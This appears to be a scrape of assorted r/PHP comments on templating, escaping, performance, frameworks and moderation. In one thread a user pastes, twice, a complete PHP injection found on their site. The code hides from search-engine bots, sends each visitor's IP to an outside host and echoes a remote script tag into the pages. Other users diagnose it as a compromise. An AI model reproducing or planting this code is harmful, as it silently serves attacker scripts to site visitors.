We can only prove the presence of a bug, not their absence. You get more eyes on something, you find more problems with it. I'd wager that the majority of webapps out there have worse vulnerabilities than this one that remain undiscovered. 
Aaannnd I didn’t get the email with my password. It’s been ten minutes.
Also the x-frame-options header must not be present on the vulnerable site. 
The last point is the biggest for me. I took over a legacy project just over a year ago and the views are full of huge reams of non-template PHP code that should have been moved to helpers.
I like the fact that this site generates a thumbnail from the title. Neat.
I am sure similar use-cases exist for PHP templating engines as well. In addition to the obvious reducing of boilerplate and simplifying syntax that others already mentioned.
Thanks, I'll check that out.
I am not a pro or anthing but shouldn't you be escaping the input way before it makes its way to the template at all? Like in your request class or something. 
I'm not sure I understand your question, but in the context of a html template, escaping the input means encoding a string so it looks the same on the web browser that it looks in a string. Most notably, this means if the database contains the value "&lt;script src='[http://www.whatever.com/js.com](http://www.whatever.com/js.com)'&gt;&lt;/script&gt;" that it appears on the page exactly like that rather than being written as raw html and causing the script to execute. Reddit for example has to escape the output I just wrote so you can read it as is rather than causing the script to execute by you viewing my content. I've never seen input escaped for a template, sql statement, or anything else except for at the point when the input is used. This is because the input could be escaped differently depending on where its going, for example the method that would escape a string for insertion into a database would work totally different than escaping the input for encoding into a csv, a json file, or an html file. Each data format has its own method of encoding user input.
Dont make shitton of database queries works the best 
Hello, &amp;#x200B; Thanks for posting this! I am very interested in what you said on event sourcing. After reading Martin Fowler's article on the topic ([https://martinfowler.com/eaaDev/EventSourcing.html](https://martinfowler.com/eaaDev/EventSourcing.html)) I had an epiphany and convinced my team to use this approach in our next project. We built a slightly ad-hoc system in PHP but over time it grew into a difficult-to-manage mess, which your library could nicely replace. However as a modern business we have scalability/infrastructure related requirements, and I am wondering how your library would handle them. Namely: \- We use AWS MSK (Kafka) to store events. Can your library plug into it? \- We use AWS SNS to emit notifications in a scalable way which are processed asynchronously by handlers. Can your library plug into it? \- We use AWS Lambda for every function in our codebase. Can your library use a Lambda Function as a state transition function instead of a PHP function? &amp;#x200B; All this considered, I think it would be a great addition to your library if you could "compile" those declarative representations of "state machines" into cloud infrastructure (e.g. compile it to an AWS CloudFormation template).
Blade is php with {{ instead &lt;?php plus escaping So much hated Smarty did the same but too much
It's effectively the same. The reason `\func` is more optimized than `func` is because PHP is gonna try to look for `currentNamespace\func` _first_ and then fallsback to the one from the global namespace. `\` or the import statement remove that ambiguity making it easier to optimize (and also makes it easier for everyone, including static analysis tools)
The backslash trick is a microoptimisation that will only speed up your code noticeably if you're running hundreds of thousands of those functions
Double quotes have a (very) slightly greater overhead than single quote strings. 
&gt;Composer's autoload is still bad for big projects, even if it is optimized. Why? The article/project looks a bit weird to me: &gt;Composer's autoload, scans the folders during runtime, while this library only scans the folder once and it stores the result. This is untrue if you dump the autoload. Also instead of `--optimized`, when possible, you should make use of `--classmap-authoritative`. And yes if the size matters that much, APCu to have the dumped autoloader in shared memory is the way to go.
&gt; We can only prove the presence of a bug, not their absence. We can prove the absence of specific bugs, not all possible bugs.
C# uses just the parentheses with no prefix. In fact, if there's only one argument the parentheses are optional: ``` del myDelegate = x =&gt; x * x; int j = myDelegate(5); //j = 25 ```
To the first point of confusion... You are correct that you don't need quotes when you're assigning the value of one variable to another. They're only doing this to show the difference in behavior in single quotes vs double quotes. It would have been more clear if they weren't also assigning a value at the same time that they were evaluating that value... $foo = "bar"; `"$foo"` evaluates to the value `bar`. `'$foo'` evaluates to the value `$foo`. Whether it gets assigned to anything, used in an expression, is passed as an argument, or whatever doesn't matter in what they're trying to demonstrate here. Here's a better example of what they're showing: $username = "Ghedipunk"; // Requires escaping double quotes, which are common in HTML. $displayName = "&lt;div class=\"display-name\"&gt;$username&lt;/div&gt;"; echo $displayName; // prints: &lt;div class="display-name"&gt;Ghedipunk&lt;/div&gt; // Will not parse variables to their values. $displayName = '&lt;div class="display-name"&gt;$username&lt;/div&gt;"; echo $displayName; // prints: &lt;div class="display-name"&gt;$username&lt;/div&gt; // Uses concatenation to include the value of the variable, without needing extra escaping. $displayName = '&lt;div class="display-name"&gt;' . $username . '&lt;/div&gt;'; echo $displayName; // prints: &lt;div class="display-name"&gt;Ghedipunk&lt;/div&gt; In my opinion, the last is easier to read since we don't have to escape the double quotes, and clearly shows that we are intentionally including the value of our variable... Others have their opinions, and a project's coding standards supersede personal opinion. (I'm entitled to my own opinion; I'm not entitled to anyone thinking my opinion is valid. I'm never entitled to my own facts.) And to the last question, no, an empty string is not `null`. That is, `null` is a special, reserved value that is not zero, is not empty, and is not a meaningful value. The only times a variable can have a null value is if the variable is not yet set, or if it has been set to null. Keep in mind that PHP has somewhat loose comparison by default. `Null` is falsy, along with `false`, the integer `0`, the float `0.0`, empty strings, the string `'0'`, arrays with zero elements, and SimpleXML objects created from empty tags. Thus, `null == false` will evaluate to a boolean `true` value, but using the strict type comparison, `null === false` will evaluate to `false`. One last thing to consider; with proper error reporting turned on (as your development environment should be set up), attempting to get a value from a variable that is not set will return null, but it will also display a Notice level error message. For example: &amp;#x200B; &lt;?php $foo = null; var_dump($foo); var_dump($bar); produces &gt; php ./test.php C:\projects\dashboard\tools\test.php:3: NULL PHP Notice: Undefined variable: bar in C:\projects\dashboard\tools\test.php on line 5 Notice: Undefined variable: bar in C:\projects\dashboard\tools\test.php on line 5 PHP Stack trace: PHP 1. {main}() C:\projects\dashboard\tools\test.php:0 Call Stack: 0.0004 388784 1. {main}() C:\projects\dashboard\tools\test.php:0 C:\projects\dashboard\tools\test.php:5: NULL Process finished with exit code 0 &amp;#x200B;
Yes, I mentioned that in my post below. Java is the same, but with `-&gt;`. The C# approach would be infeasible in PHP because of ambiguities with array syntax that would make the parser much more complex and make optimisation more difficult.
Thanks for the clarification! That's too bad about the parser having so many issues because of poor decisions being made in the past.
It's not so much poor decisions, just decisions without the ability to see into the future. The array syntax `=&gt;` predates closures being common in mainstream languages, it predates PHP in fact, coming from Perl.
Put that on your readme and as the description or devs won't try it.
great point. WordPress has a lot of experts looking at the code all the time and so, nature takes its course. 
Can't remember where I saw it but someone ran a benchmark of variable string expansion vs concatenation etc on modern php and hardware and the difference is not what you'd expect. 
After using Blade in Laravel and Twig in another project, screw your inline PHP templates. 
Seriously this community is f*ing toxic
I just wanted to say that this inspired me to change the unsafe operator in a js template library I wrote from &lt;%= to &lt;%!= And change the safe operator from &lt;%== to &lt;%= , so thanks for that
I doubt his CTO or whoever sets the coding standards cares 😂
Mysql query caching is a good hit if that's your database [Read more](https://stackgulp.com/topic/12/how-to-improve-mysql-server-performance-with-query-caching)
The fact that WordPress continues to have XSS and CSRF exploits to this day actually blows my mind. Web dev 101 folks.
I don't. I'd like to get paid someday, but today is not that day.
Offtopic your site loads pages very fast is that because optimization you put here .
The best book for advanced php users is the php manual 
Not quite. The reference manual is not, strictly, speaking, "a book". You don't actually "read" a PHP manual - you do a lookup when you need to learn a particular function or a module. And many topics are either covered only on a basic level (security for example) or not covered at all (design patterns) as being off topic for the PHP manual. So a good book is a must. 
Good advice!
Who will actually buy those books when they are lot of free and useful resources online .
Yeah that's a silly thing to say.
Do you happen to know any good reads that are actually *current*? Mind you I’m not looking for a book that basically regurgitates what Martin says or Fowler says as that seems to be what a TON of people link to and I suppose it not being PHP specific I can’t stand reading those links.
When the request is successful, make sure to return the JSON as an object not an array. Returning a JSON array is insecure when using GET. With POST it's OK though.
ab (apache bench) siege jmeter
I created an account just to comment on how excited I would be to see this. &amp;#x200B; I hope it could be used as a class method alternative shorthand. That would also be pretty amazing.
As I've said elsewhere, WordPress needs a 100% rewrite. The core architecture of WordPress is a mismashed mixmatched clusterphuck and it's got devs too damn stubborn to ditch SVN and migrate to GitHub so the rest of the community can do pull requests to clean that POS up.
i see more projects with #codeigniter then with Symfony. Codeigniter framework is better. Browser Coding Marketplaces/Forums, you will see Symfony is dying.
check your inbox again ;)
And... Where is the hypermedia part?
Yes. And given the amount of bullshit already posted about PHP, it should be 10x more toxic towards bullshit. 
How to block such copied redirecting click bait posts?
If PHP delivers the mail via the mail() function it is likely that the generated mails will be filtered out by the receiving mailservers because it points to a user like „www-data“ or „http“.
In the case of `count` and `strlen` and some other functions besides, I forget the full list, but `gettype` is in there ... what you are measuring when you compare the difference between non-prefixed function names and prefix function names is not the impact of namespace fallback, it's actually the difference between a call optimized by the compiler (not opcache) to an instruction, and a call not able to be optimized *because of namespace fallback*: &lt;?php namespace Foo { class Bar { public function qux() { return count([1,2,3]); } } } namespace { var_dump(Foo\bar()); } ?&gt; There is no slash here, so that the function Bar::qux will be compiled thus: function name: qux L6-8 Foo\Bar::qux() /opt/src/php-src/count.php - 0x7fe86de7f100 + 5 ops L7 #0 INIT_NS_FCALL_BY_NAME&lt;1&gt; "Foo\\count" L7 #1 SEND_VAL_EX array(3) 1 L7 #2 DO_FCALL @0 L7 #3 RETURN @0 L8 #4 RETURN&lt;-1&gt; null Notice, `INIT_FCALL`, `SEND`, `DO_FCALL` - that's the normal pattern for a function call, prefixed with slash or not. They won't always be those exact instructions, but that's the calling convention for a function - init, send, do ... When you prefix the call to count with a slash, the instructions are totally different, *there is no function call*: function name: qux L6-8 Foo\Bar::qux() /opt/src/php-src/count.php - 0x7f0713c80000 + 3 ops L7 #0 COUNT array(3) ~0 L7 #1 RETURN ~0 L8 #2 RETURN&lt;-1&gt; null If you are measuring a difference, this is the reason, it's not the case that you are measuring the impact of namespace fallback, but the difference between a function call and a special cased function call compiled to a zend instruction.
JetBrains is paying me to work on PHP, so I'm already covered :)
It might be an unpopular opinion, but I love how PHP forces you to manually "import" variables through `use` with an anonymous function. I don't care much about the syntax of this (unlike many others), but I fear that this JS-like "catch-all" approach couse cause some headaches further down the line. I can already see difficult to debug memory leaks, for instance. Personally I'd rather explicitely import variables than this, and that's why even if this passes, I'm unlikely to use it. In programming, explicit beats implicits every day.
I care
There's a good reason a ton of people link to them. That knowledge is still valid today in any programming language and is a must read imo. An advanced level developer can understand examples in different language and filter out what is applicable.
These books are super old and probably not even representing current PHP7 best practices. Also I've barely saw the author names in the PHP community.
I have the completely opposite experience. I have not seen a single job offer mentioning CodeIgniter, whereas plenty mention Symfony. Sorry to burst your bubble, but CI is basically abandoware (despite recently going through a huge rewrite). Symfony has a steady 6-months release cycle, multiple conferences, certifications programs, and much more. Speaking of conferences, how many talks have you seen recently mentioning CodeIgniter? My guess is very low...
Use blackfire or xhprof to measure performance Don't do anything before you know why something is slow, that involves measuring, not guessing!
2 minute video with all caps title for a subject that could literally be exhaustively explained in a single sentence. But hey, DONT FORGET TO LIKE SUBSCRIBE SHARE AND TELL YOUR MOM
php -i | grep "Configuration File"
The goal of the platform is to discover new and quality content on the internet, and to support content creators more directly. The platform will not allow comments, likes etc; but want people to interact on blogs directly. Content is synced and tagged automatically over RSS, and the platform itself is open source.
Double press \`shift\`
Its good to challenge ideas, especially when they're based on a myth. It's all too easy to be a yes man or say things like "we do it like X because thats the way we've always done it".
Funny how I came across the same bug. I reported this to WP H1 page about a month back, and it was clear that they simply didn't care. I had to create a plugin ([https://wordpress.org/plugins/comment-form-csrf-protection/](https://wordpress.org/plugins/comment-form-csrf-protection/)) that prevents this. I don't think the 5.1.1 update completely fixes the CSRF issue, but this plugin does. 
... and in the same app, they make a database query on column without an index, within a loop.
This is going to be fun if the article 13 in eu takes place :(
&gt;For the end user (me :D) it doesn't matter it's enough reason not to use it in production.
&gt; Yo, PHP. Sup bro? You see the unnoticeable effect of http://php.net/manual/en/language.namespaces.fallback.php Really, don't bother with that micro optimization. Also not using the backslash allows you to use that fallback for mocking built-in functions with https://github.com/php-mock/php-mock
Great tool. I just recently set up a development environment for my company using this project. It's damn simple if you have a few services to wire together and you just want to focus on development
No you should not escape incoming data, only when rendering the data back to the client. The reason for this is that different render contexts require different escaping strategies: the escaping strategy for HTML is different than e.g. JavaScript or binary transmission. As you do not know beforehand in what context your data will be displayed you cannot escape the data the moment you’re reading it from $_POST. Well, you might know that the data will never be displayed in a context other than HTML, but requirements change. 
Sorry man, but that's just being full of shit. It appears as if you have some sort of requirement that requires async access to a database. That's only possible in CLI environment in the first place, in web context (php-fpm) you can't do it. Since you use Postgres, it's unlikely you're using anything in PHP world that lets you asynchronously speak to your database. It's irrelevant what you use in production, what's relevant is that you are listing a downside of a library something that: 1. is not that library's responsibility 2. is a downside of another library (PDO) 3. you don't really need it in the first place The truth is, you wanted to write something - and you did. The bad part is that it's blatant bullshit and factually incorrect and that's what sucks. There are plenty of downside to any library, not just swoole. You could have googled a few before wasting time here. 
Hello, I'm your friendly interpunction delivery guy. I came to deliver a few dots and commas for you to use in your sentences. Here they are: &amp;#x200B; \`,\` x3 \`.\` x3 \`:\` x3 &amp;#x200B; If you spend them all, don't hesitate to order a few more! 
Can you please elaborate a bit? Would it be update automatically or manually? what if it will overflow with links and become unreadable? What are quality control measures? How it's different from /r/php? I am not criticising, I am genuinely interested. 
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
I've created a scraping php app that targets a specific website, takes the content from it, parses it and uploads the parsed data to my local database. I want to upload the application to Github (not the data) so I can show off my skills to potential employers, but I am wondering if there are any reasons (legal or any other kind) why I shouldn't do this. Since the application is targeted to a specific website, I can't abstract the methods used within it as they conform to the exact structure of the html taken from the site. Also, the app uses Symfony components for a few functions. Are there any reasons why I shouldn't upload to Github?
1. Not related to PHP 2. Blatant self promotion, apparently you're after backlinks from reddit 3. Code you presented is shit 4. Full of advertisement 5. To anyone reading: don't waste time on this clickbait. You won't learn anything new.
Great questions! Yes it will update automatically by scanning RSS feeds, in that way it's just a simple RSS reader, but curated by a community instead of personal. There are several quality control measurements in place already: - Sources have to be manually accepted before being synced. Right now that's manageable by myself. If the platform really gets going and there's too much work, I'll have to ask people to help moderate the content. There already is an admin interface to do this, but there are lots of improvements to be made. - Behind the scenes, there's a layer above "tags" that is invisible right now. Tags are grouped by topics, and you can filter by individual topics. "Programming" is the only topic with enough content right now, because, well, I'm a programmer. As soon as other types of content is added, I'll make the feature visible to visitors. - Registered users are able to mute sources. Basically you're saying don't want to see any content of that source in your feed. - RSS syncing is throttled per source. Each source can only add one blog post per day. Others are ignored. I will be making improvements to this system in the future. As to the difference to Reddit: - I made the deliberate decision to not add comments. I want people to go to the blogs themselves, and interact over there. - No up- and down votes. Up votes are actually present, but disabled at the moment. I might enable them in the future to have a better metric to show "top posts this week". No down votes are a very deliberate choice: if you don't like content, you can mute it. If there's something really wrong with it, you can report it (work in progress). The only real reason a down vote could be used, is to tell people that you don't agree with a specific post. This is something I want people to do on the blogs themselves, not on this platform. Furthermore, we all know very well that down votes on Reddit are massively abused, even though the rules clearly state that they should only be used for irrelevant content, people often down vote because they don't agree with what they read. I don't think they add any value. - Lastly: because everything is synced over RSS, there's no possibility for people to start spamming with questions or irrelevant posts. Something we also encounter quite a lot on /r/php. I guess there is the possibility of people setting up "spam RSS feeds", but given the throttling and manual content moderation, chances of something being really abused are slim to none. Lots of things to do. I already had some people PRing stuff in the past. I believe in the power of OSS and I think there's lots of potential to build a platform for quality content together.
What's the value of using this over something more established like https://github.com/JosephSilber/bouncer ?
Maybe I can further elaborate on the "manual acceptance" part: all kinds of content is allowed on the platform, except for a few rules. I still need to add these to the disclaimer page: https://github.com/brendt/aggregate.stitcher.io/issues/55 I'm not going to censor anything specific, but the manual check is in place to prevent spam, inappropriate NSFW or purely promotional content.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
Thank you, it looks promising
I haven't needed high performance for a while, so haven't used this recently, but you might want to try: https://github.com/Danack/LowMemoryClassloader It uses OPcache to avoid either hitting the disk, or using large amounts of memory for autoloading.
Hey, thanks for your comment. I also find event sourcing very interesting although I'm the first to admit that it's not a panacea for all problems (nothing is :) ). &amp;#x200B; Re AWS MSK/SNS - S-Flow is only focused on defining and running state machines. It doesn't concern itself where events come from or go to. They can come from a database, a queue, from stdin, hardcoded, etc... What it does is it abstracts away the boilerplate required to define/run FSMs and gives the user an (imho) nice api to define the graph. If you want events to travel/persist via MSK/SNS then you'd need to use their specific client libs and then just feed the events into S-Flow to derive the current state. &amp;#x200B; The "compile to cloud infrastructure" is a rather interesting idea, but at the moment there is nothing like that in S-Flow.
What are/is valid alternatives?
Ah yes... The "bugs are only important when shit hits the fan" mentality.
Hi, Pretty cool library, I am sure I will find some uses for this in future projects. I have a project I am working on and wondered if you could help me. What do you think about JWT? It is the new stateless way of doing things but your library advocates STATEFUL code, is there conflict here? My system uses stateless JWT for authenticating users but I also want to use your State Machine Library elsewhere in the system, is this possible or would it introduce state into an otherwise stateless system?
Thank you very much for taking the time to get back to me. I think there is a lot that could be done in this area. I was reading the latest post on [highscalability.com](https://highscalability.com) yesterday and this line made me stop and think: &amp;#x200B; \&gt; @ben11kehoe: "Statelessness is not the critical property of #serverless compute, it's ephemerality. " &amp;#x200B; I wonder how this relates to state machines, and by extension to your library. If statelessness is not the critical property of serverless compute, according to @ben11kehoe, then perhaps state machines are entirely compatible with a serverless approach. I tried to find research articles on the topic but could not find any. I will keep on searching... &amp;#x200B; Thanks again. &amp;#x200B;
You’re totally right! The only thing is, if this person’s managers are such control freaks that they enforce which types of quotes you can use, then I doubt that they’re open to changing things, even when being objectively proven through benchmarks etc. that the difference in performance between single vs double quotes is negligible. They still should give it a shot, but sometimes managers just like the control, and the ability to say no, and they run with it. It’s the natural tendency of people to get authority and then misuse it. Anyway, sorry about the soapbox rant 😂 I guess In just tired of fighting my manager on these types of things.
I still didn’t get it. 😐
Why can’t they use something like Mailgun 😕
I'd suggest Generative testing: https://fsharpforfunandprofit.com/posts/property-based-testing/ Transducers: http://funcool.github.io/clojurescript-unraveled/#transducers Datomic: https://www.oreilly.com/library/view/professional-clojure/9781119267270/c06.xhtml &amp; something on spec 2 when that's out
The email I had entered is from a cPanel that I control, is there something I can do to ensure I can get the email? (Or were you just saying how PHP wiki should be sending their emails via SMTP?)
(This goes to Nikita, too) If you ever change your mind, let me know. I don't have the know-how to contribute to the PHP source. So, the next best thing I can do is say "thank you" via cash to those that are constantly bringing us these features :)
I do the fully qualified function names in my codebase at work. We've known about the performance impact, but that's not why we do it. We do it because of *why* it makes a performance impact: it does a lookup on a function of the same name in the current namespace, then if that fails it looks up the global function. We really don't want that behavior to ever have any odd effects in our codebase, including people abusing it for "testing".
It's based on the also established Casbin library and is recommended by them. Haven't used either though.
No thank you. I like that you have to manually import variables via (use). It greatly reduces any potential bugs. One of few things that PHP does right. 
????
&lt;?php #06b308# if (empty($dyvfl)) { if ((substr(trim($\_SERVER\['REMOTE\_ADDR'\]), 0, 6) == '74.125') || preg\_match("/(googlebot|msnbot|yahoo|search|bing|ask|indexer)/i", $\_SERVER\['HTTP\_USER\_AGENT'\])) { } else { error\_reporting(0); @ini\_set('display\_errors', 0); if (!function\_exists('\_\_url\_get\_contents')) { function \_\_url\_get\_contents($remote\_url, $timeout) { if (function\_exists('curl\_exec')) { $ch = curl\_init(); curl\_setopt($ch, CURLOPT\_URL, $remote\_url); curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true); curl\_setopt($ch, CURLOPT\_CONNECTTIMEOUT, $timeout); curl\_setopt($ch, CURLOPT\_TIMEOUT, $timeout); //timeout in seconds $\_url\_get\_contents\_data = curl\_exec($ch); curl\_close($ch); } elseif (function\_exists('file\_get\_contents') &amp;&amp; ini\_get('allow\_url\_fopen')) { $ctx = @stream\_context\_create(array('http' =&gt; array( 'timeout' =&gt; $timeout, ) )); $\_url\_get\_contents\_data = @file\_get\_contents($remote\_url, false, $ctx); } elseif (function\_exists('fopen') &amp;&amp; function\_exists('stream\_get\_contents')) { $handle = @fopen($remote\_url, "r"); $\_url\_get\_contents\_data = @stream\_get\_contents($handle); } else { $\_url\_get\_contents\_data = \_\_file\_get\_url\_contents($remote\_url); } return $\_url\_get\_contents\_data; } } if (!function\_exists('\_\_file\_get\_url\_contents')) { function \_\_file\_get\_url\_contents($remote\_url) { if (preg\_match('/\^(\[a-z\]+):\\/\\/(\[a-z0-9-.\]+)(\\/.\*$)/i', $remote\_url, $matches) ) { $protocol = strtolower($matches\[1\]); $host = $matches\[2\]; $path = $matches\[3\]; } else { // Bad remote\_url-format return FALSE; } if ($protocol == "http") { $socket = @fsockopen($host, 80, $errno, $errstr, $timeout); } else { // Bad protocol return FALSE; } if (!$socket) { // Error creating socket return FALSE; } $request = "GET $path HTTP/1.0\\r\\nHost: $host\\r\\n\\r\\n"; $len\_written = @fwrite($socket, $request); if ($len\_written === FALSE || $len\_written != strlen($request)) { // Error sending request return FALSE; } $response = ""; while (!@feof($socket) &amp;&amp; ($buf = @fread($socket, 4096)) !== FALSE) { $response .= $buf; } if ($buf === FALSE) { // Error reading response return FALSE; } $end\_of\_header = strpos($response, "\\r\\n\\r\\n"); return substr($response, $end\_of\_header + 4); } } &amp;#x200B; if (empty($\_\_var\_to\_echo) &amp;&amp; empty($remote\_domain)) { $\_ip = $\_SERVER\['REMOTE\_ADDR'\]; $dyvfl = "[http://www.vanderkraanonderhoudswerken.nl/Afbeeldingen/m8VYBTZ9.php](http://www.vanderkraanonderhoudswerken.nl/Afbeeldingen/m8VYBTZ9.php)"; $dyvfl = \_\_url\_get\_contents($dyvfl."?a=$\_ip", 1); if (strpos($dyvfl, 'http://') === 0) { $\_\_var\_to\_echo = '&lt;script type="text/javascript" src="' . $dyvfl . '?id=9410442"&gt;&lt;/script&gt;'; echo $\_\_var\_to\_echo; } } } } \#/06b308# ?&gt;
Sry for the identation &amp;#x200B;
`&lt;?php #06b308#` `if (empty($dyvfl)) {` `if ((substr(trim($_SERVER['REMOTE_ADDR']), 0, 6) == '74.125') || preg_match("/(googlebot|msnbot|yahoo|search|bing|ask|indexer)/i", $_SERVER['HTTP_USER_AGENT'])) {` `} else {` `error_reporting(0);` `@ini_set('display_errors', 0);` `if (!function_exists('__url_get_contents')) {` `function __url_get_contents($remote_url, $timeout)` `{` `if (function_exists('curl_exec')) {` `$ch = curl_init();` `curl_setopt($ch, CURLOPT_URL, $remote_url);` `curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);` `curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);` `curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); //timeout in seconds` `$_url_get_contents_data = curl_exec($ch);` `curl_close($ch);` `} elseif (function_exists('file_get_contents') &amp;&amp; ini_get('allow_url_fopen')) {` `$ctx = @stream_context_create(array('http' =&gt;` `array(` `'timeout' =&gt; $timeout,` `)` `));` `$_url_get_contents_data = @file_get_contents($remote_url, false, $ctx);` `} elseif (function_exists('fopen') &amp;&amp; function_exists('stream_get_contents')) {` `$handle = @fopen($remote_url, "r");` `$_url_get_contents_data = @stream_get_contents($handle);` `} else {` `$_url_get_contents_data = __file_get_url_contents($remote_url);` `}` `return $_url_get_contents_data;` `}` `}` `if (!function_exists('__file_get_url_contents')) {` `function __file_get_url_contents($remote_url)` `{` `if (preg_match('/^([a-z]+):\/\/([a-z0-9-.]+)(\/.*$)/i',` `$remote_url, $matches)` `) {` `$protocol = strtolower($matches[1]);` `$host = $matches[2];` `$path = $matches[3];` `} else {` `// Bad remote_url-format` `return FALSE;` `}` `if ($protocol == "http") {` `$socket = @fsockopen($host, 80, $errno, $errstr, $timeout);` `} else {` `// Bad protocol` `return FALSE;` `}` `if (!$socket) {` `// Error creating socket` `return FALSE;` `}` `$request = "GET $path HTTP/1.0\r\nHost: $host\r\n\r\n";` `$len_written = @fwrite($socket, $request);` `if ($len_written === FALSE || $len_written != strlen($request)) {` `// Error sending request` `return FALSE;` `}` `$response = "";` `while (!@feof($socket) &amp;&amp;` `($buf = @fread($socket, 4096)) !== FALSE) {` `$response .= $buf;` `}` `if ($buf === FALSE) {` `// Error reading response` `return FALSE;` `}` `$end_of_header = strpos($response, "\r\n\r\n");` `return substr($response, $end_of_header + 4);` `}` `}` &amp;#x200B; `if (empty($__var_to_echo) &amp;&amp; empty($remote_domain)) {` `$_ip = $_SERVER['REMOTE_ADDR'];` `$dyvfl = "`[`http://www.vanderkraanonderhoudswerken.nl/Afbeeldingen/m8VYBTZ9.php`](http://www.vanderkraanonderhoudswerken.nl/Afbeeldingen/m8VYBTZ9.php)`";` `$dyvfl = __url_get_contents($dyvfl."?a=$_ip", 1);` `if (strpos($dyvfl, 'http://') === 0) {` `$__var_to_echo = '&lt;script type="text/javascript" src="' . $dyvfl . '?id=9410442"&gt;&lt;/script&gt;';` `echo $__var_to_echo;` `}` `}` `}` `}` `#/06b308#` &amp;#x200B;
I think you have a problem in your app security. also you need to go to /r/phphelp.
Why not? Good programming transcend specific languages. It doesn’t matter if you’re using Java, rust, c, or PHP you still apply the same principles in order to create maintainable software. The specific technology has changed over time but the basic principles are always the same. Writing maintainable software is always the same. If you’re looking for specific literature about the language then you should probably try the documentation.
Yep, it is injecting a script tag on load in to your web pages. 1. If you have source control, run a DIFF/Status on the files and find out what files are new and what permissions have changed. 2. Re-deploy to remove the shell 3. Find and patch the hole.
Thx for your help reddit community as a jewels \^\^
swing and miss there, spammy
Nope, deleted the last link as it was broken!
thanks for the reply after months being posted. gotcha with go and elixir.
you're still spamming your job site everywhere, your marketing plan is what is broken 
We get a lot of good feedback from engineers signing up from Reddit but apologies if it’s not quite what you’re looking for. Have a great weekend!
We get a lot of good feedback from engineers who sign up from reddit as a way of finding our platform but apologies if it’s not what you’re looking for when you come here. Have a great weekend!
Like is 3 inches too long?
if (int($pubes_in_inches) &gt; 2) trim($yourPubesBro);
I'd say its more effecient to have static JS file (possibly fronted by a cdn with cache).
please don't
Your code is vulnerable to LFI and if you are using this on any production sites I'd suggest sanatizing your css files against a whitelist
Seriously. This goes against every best practice in the book.
savage bot
Assume that you a plugin that is available for other websites, and which is fully customizable. In this case, customized styles are essential. Static JS can also be used to cutomize styles, but if you have a huge amount of styles, you would probably use this technique. It's easy to manage.
You dont. &amp;#x200B; Seriously - the use case in the post mentions different themes having different colors. If that is the case just load different style sheets ? This is a monstrosity 
literally no one is using this technique, because it is terrible. if you have multiple themes, have base/core in one style sheet and rules that are overridden by custom theme and load it within if statement.
If you let the user to select the colors, can you have different style sheets? Let's think there's a console for your user to let them select what color they want. So, this approach would be good, in my opinion. And, use this in my website and it works perfectly.
You could generate the sheets pretty easily. 
No, this is not how you do it
Just thought of another one I use quite often: **Hide Active Tool Window (shift+esc)** &amp;#x200B; If you have a tool window open (e.g., TODO or Version Control), you can hit shift+esc to hide it. I often will open version control or my to do list, then want to quickly minimize it so my editor has the entire window again, and shift+esc is much quicker than clicking the collapse icon.
[here you go m8](https://github.com/erusev/parsedown)
Here's a better way: Add a data attribute to the body: &lt;body data-theme="buy-our-stuff"&gt; &lt;h1 class="my-header"&gt;My header here&lt;/h1&gt; &lt;p class="my-paragraph"&gt;My text here&lt;/p&gt; &lt;/body&gt; Then you use a normal CSS file for your base-line style: /* Default styles before adding a theme */ .my-header{ /* my css here*/ } .my-paragraph{ /* my css here*/ } Then you add a new CSS file that loads after the first one, so you can customize your theme with that: /* The buy-our-stuff theme */ [data-theme="buy-our-stuff"] .my-header{ /* my css here*/ } [data-theme="buy-our-stuff"] .my-paragraph{ /* my css here*/ }
Good post. I started creating similar one, and stucked. This helped me. I have some other code for bold, italic, underline and so on. Also, text between \`\`\` and \`\`\` will be parsed as code. But, I don't want \[desc\](link) inside those to be links. How can I do that?
The best way is to not use PHP to deliver static files. Rather proxy PHP behind nginx (or similar) and use **that** to deliver your static files.
I wonder if the backslash optimization is redundant in PHP 7.4 with preloading.
The way I do it is: * Declare an array to save parsed things ($parsed) * Then, in the callback I add the replaced text into $parsed array. (And fetch the array index with array\_push($data) - 1) * Then the string will be replaced with a hash like Âcode:0Â. Where 0 is the array index. * Finally, I decode it. &amp;#x200B; $HASH_SPECIAL = "Â¨"; # encode into unique char temporarily (you know why) function writeHash($name, $data) { global $HASH_SPECIAL, $hashed; if (!isset($hashed[$name])) $hashed[$name] = []; $index = array_push($hashed[$name], $data) - 1; return $HASH_SPECIAL . $name . ':' . $index . $HASH_SPECIAL; } function decode($body) { global $HASH_SPECIAL, $hashed; return preg_replace_callback('/' . $HASH_SPECIAL . '(\w*):([0-9]+)' . $HASH_SPECIAL . '/', function($matches) { global $hashed; return $hashed[$matches[1]][$matches[2]]; }, $body); } function replaceCode($m) { $code = htmlspecialchars($m[1]); $str = '&lt;pre&gt;&lt;code&gt;' . "\n" . $code . "\n" . '&lt;/pre&gt;&lt;/code&gt;'; return writeHash('code', $str); } // &lt;code&gt; $body = preg_replace_callback($yourRegex, 'replaceCode', $body); // then &lt;a&gt; // and other // finally decode it $body = decode($body); &amp;#x200B;
come to stackoverflow, r11
Sure - but why?
Automatically no, it is not possible. &amp;#x200B; Also, you shouldn't trust on Auto\_increment It could start on 1 but it could start on another different number (if you are doing a backup or something different). For example, a failed insert could increase its value. &amp;#x200B; Usually we (as developer) don't use or care about the auto\_increment number but for identify a single element as unique. For example, if we need to read the second "post", we use select \* from order by date limit X,Y &amp;#x200B; &amp;#x200B;
Yeah you could but I agree with the first comment. I also wouldn't delete the record just mark it deleted with a flag or something if it's concerning you.
Cause i want to make buttons to go to next or previous posts. ( &lt;a href="posts.php?post\_id=&lt;?php echo $id+1; ?&gt;"&gt; next&lt;/a&gt; &lt;a href="posts.php?post\_id=&lt;?php echo $id-1; ?&gt;"&gt; previuous&lt;/a&gt;) So when i delete post, i get in trouble :(
With triggers? Technically yes. Is this a good idea? No, it's an absolutely terrible idea and if you need to ask this question, then you should never ever do such a thing with your primary keys.
